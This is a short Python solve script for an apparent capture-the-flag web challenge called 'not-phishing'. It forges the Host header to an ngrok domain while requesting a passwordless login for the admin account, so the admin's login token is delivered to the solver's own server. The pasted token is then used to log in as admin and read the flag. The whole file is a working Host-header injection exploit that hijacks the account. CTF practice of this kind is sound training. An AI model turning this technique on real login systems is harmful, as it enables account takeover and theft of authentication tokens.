import requests,re

site = 'http://not-phishing.challs.olicyber.it:38100/'

s = requests.Session()
s.headers.update(
    {
        "Host":"6cf7-93-56-139-175.ngrok-free.app"
    }
) 
r = s.post(site+"passwordless_login.php", data={"email":"admin@fakemail.olicyber.it"})

# If you check on the console of the web server you'll see the token of the admin, know just make a get request with it
admin_token = input("Your admin token \n> ")

s.get(site + f"token_login.php?token={admin_token}")
flag_re = s.get(site+"admin.php")

flag = re.search(r"flag{.*}",flag_re.text)
print(flag.group())